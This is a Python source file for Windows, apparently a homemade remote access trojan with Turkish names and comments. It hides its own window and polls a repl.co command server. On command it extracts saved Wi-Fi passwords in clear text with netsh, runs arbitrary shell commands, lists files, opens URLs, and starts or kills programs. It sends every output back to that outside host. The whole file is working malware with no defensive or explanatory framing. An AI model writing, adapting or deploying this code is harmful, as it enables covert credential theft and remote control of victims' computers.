import requests as req
from time import sleep
import os
import sys
import subprocess
import threading
import win32gui, win32con
import webbrowser as wb


the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
while True:
    try:
        def intsifre():
            şifreler = []
            # getting meta data
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])

            # decoding meta data
            data = meta_data.decode('utf-8', errors="backslashreplace")

            # spliting data by line by line
            data = data.split('\n')

            # creating a list of profiles
            profiles = []

            # traverse the data
            for i in data:

                # find "All User Profile" in each item
                if "All User Profile" in i:
                    # if found
                    # split the item
                    i = i.split(":")


                    # item at index 1 will be the wifi name
                    i = i[1]


                    # formatting the name
                    # first and last chracter is use less
                    i = i[1:-1]


                    # appending the wifi name in the list
                    profiles.append(i)

            #for asd in profiles:
            #    print(asd)
            #    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', str(asd), "key=clear"])
            #    results = results.decode('utf-8', errors="backslashreplace")
            #    results = results.split('\n')
            #    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            #    print(results[0])

            # printing heading
            #print("{:<30}| {:<}".format("Wi-Fi Name", "Password"))
            #print("----------------------------------------------")

            # traversing the profiles
            for i in profiles:

                # try catch block beigins
                # try block
                try:
                    # getting meta data with password using wifi name
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])

                    # decoding and splitting data line by line
                    results = results.decode('utf-8', errors="backslashreplace")
                    results = results.split('\n')

                    # finding password from the result list
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

                    # if there is password it will print the pass word
                    try:
                        #print("{:<30}| {:<}".format(i, results[0]))
                        şifreler.append("{:<30}| {:<}".format(i, results[0]))
                        #with open("sifrreee.txt", "a")as f:
                        #    f.writelines("{:<30}| {:<}".format(i, results[0]))
                        #    f.writelines("\n")

                    # else it will print blank in fornt of pass word
                    except IndexError:
                        #print("{:<30}| {:<}".format(i, ""))
                        şifreler.append("{:<30}| {:<}".format(i, ""))



                # called when this process get failed
                except subprocess.CalledProcessError:
                    #print("Encoding Error Occured")
                    return "Encoding Error Occured"
            return şifreler

        def gönder(bilgi):
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":bilgi})

        def komutçalıştır(komut):
            #os.system(komut)
            sb = subprocess.check_output(komut.split(" "))
            print(sb)
            sbb = sb.decode('utf-8', errors="backslashreplace")
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"{sbb}"})

        def asılkomut(komut):
            sonuc = subprocess.run(komut.split(" "), shell=True, capture_output=True)
            req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{sonuc.stdout.decode('utf-8', errors='backslashreplace')}"})
        data = {"nm":"nul"}
        while True:

            r = req.get("https://musallat.zgretin.repl.co/gidecekbilgi")

            if r.text != "nul":
                print(r.text)

                #işlemler
                if r.text == "intşif":
                    #gönder(intsifre())
                    print(intsifre())
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{intsifre()}"})
                elif r.text == "null":
                    os.system("taskkill /im musallat.exe /f")
                elif r.text == "listdir":
                    print(os.listdir())
                    req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{os.listdir()}"})
                elif r.text.startswith("kmt:"):
                    komut = r.text.replace("kmt:", "")
                    print(komut)
                    komuttread = threading.Thread(target = komutçalıştır, args=[komut])
                    komuttread.start()
                elif r.text.startswith("cmd:"):
                    komut = r.text.replace("cmd:", "")
                    print(komut)
                    komuttread2 = threading.Thread(target = asılkomut, args=[komut])
                    komuttread2.start()

                elif r.text.startswith("aç:"):
                    url = r.text.replace("aç:", "")
                    wb.open(url)

                elif r.text.startswith("run:"):
                    sonuçç = subprocess.run(["start", r.text.replace("run:", "")], shell=True, capture_output=True)
                    req.post("https://musallat.zgretin.repl.co/musallat",
                             data={"nm": f"{sonuçç.stdout.decode('utf-8', errors='backslashreplace')}"})

                elif r.text.startswith("kapa:"):
                    komutt = r.text.replace("kapa:", "")
                    sonuç = subprocess.run(["taskkill", "/im", komutt, "/f"], shell=True, capture_output=True)
                    req.post("https://musallat.zgretin.repl.co/musallat",
                             data={"nm": f"{sonuç.stdout.decode('utf-8', errors='backslashreplace')}"})


                req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"{r.text}"})

                req.post("https://musallat.zgretin.repl.co/gidecekbilgi", data=data)
            else:
                sleep(0.2)
    except Exception as e:
        print(e)
        req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{e}"})
    sleep(1)
